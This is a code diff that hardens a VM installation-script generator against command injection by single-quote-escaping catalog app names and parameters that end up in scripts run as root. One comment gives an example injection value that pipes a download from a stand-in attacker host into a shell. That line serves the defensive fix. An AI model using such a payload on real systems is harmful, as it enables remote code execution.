@@ -525,6 +525,17 @@ chmod +x /target/var/lib/cloud/scripts/per-instance/${scriptName}`
   }
 
   /**
+   * Single-quote-escapes a value for safe embedding in a bash script. Application
+   * catalog values (name/parameters) are GLOBAL and cross-tenant and end up in a
+   * script that runs as ROOT in the guest during install; wrapping them in a
+   * hardened single-quoted literal ('\'' for each embedded quote) prevents command
+   * injection (e.g. a name like `x$(curl http://attacker|sh)`).
+   */
+  private bashSingleQuote (s: unknown): string {
+    return `'${String(s).replace(/'/g, "'\\''")}'`
+  }
+
+  /**
    * Generates an installation script for a specific application.
    *
    * @param {Application} app - The application to generate a script for
@@ -536,17 +547,26 @@ chmod +x /target/var/lib/cloud/scripts/per-instance/${scriptName}`
 
     const parsedCommand = this.parseInstallCommand(installCommand, app.parameters)
 
+    // app.name comes from the GLOBAL, cross-tenant Application catalog and is written
+    // verbatim into a script that runs as ROOT in the guest. Escape it before
+    // embedding: a single-quoted literal for the echo lines, a newline-stripped form
+    // for the inert comment (comments can't be quote-escaped, but a newline would let
+    // a crafted name break out), and an alphanumeric token for the log filename.
+    const nameArg = this.bashSingleQuote(app.name)
+    const nameComment = String(app.name).replace(/[\r\n]+/g, ' ')
+    const logSafeName = String(app.name).replace(/[^a-zA-Z0-9]+/g, '_')
+
     return `#!/bin/bash
-# Installation script for ${app.name}
-echo "Starting installation of ${app.name}..."
-LOG_FILE="/var/log/app_install_${app.name.replace(/\s+/g, '_')}.log"
+# Installation script for ${nameComment}
+echo "Starting installation of "${nameArg}"..."
+LOG_FILE="/var/log/app_install_${logSafeName}.log"
 
 {
   ${parsedCommand}
   if [ $? -eq 0 ]; then
-    echo "${app.name} installation completed successfully"
+    echo ${nameArg}" installation completed successfully"
   else
-    echo "${app.name} installation failed with exit code $?"
+    echo ${nameArg}" installation failed with exit code $?"
   fi
 } 2>&1 | tee -a $LOG_FILE
 `
@@ -560,12 +580,18 @@ LOG_FILE="/var/log/app_install_${app.name.replace(/\s+/g, '_')}.log"
    * @returns {string} The parsed command
    */
   private parseInstallCommand (command: string, parameters: any = null): string {
-    // Replace placeholders in the command with actual parameters
+    // Replace placeholders with actual parameters. Parameters come from the GLOBAL,
+    // cross-tenant Application catalog and end up in a root-run guest script, so:
+    //  - only accept safe placeholder keys — a key like '(' would crash `new RegExp`
+    //    with a SyntaxError and abort the whole VM create, and regex metacharacters
+    //    would mis-substitute; validate the key and use a literal split/join instead;
+    //  - single-quote-escape each value so it cannot break out and run as root.
     let parsedCommand = command
-    if (parameters) {
+    if (parameters && typeof parameters === 'object') {
       for (const [key, value] of Object.entries(parameters)) {
+        if (!/^[A-Za-z0-9_]+$/.test(key)) continue
         const placeholder = `{{${key}}}`
-        parsedCommand = parsedCommand.replace(new RegExp(placeholder, 'g'), value as string)
+        parsedCommand = parsedCommand.split(placeholder).join(this.bashSingleQuote(value))
       }
     }
     return parsedCommand
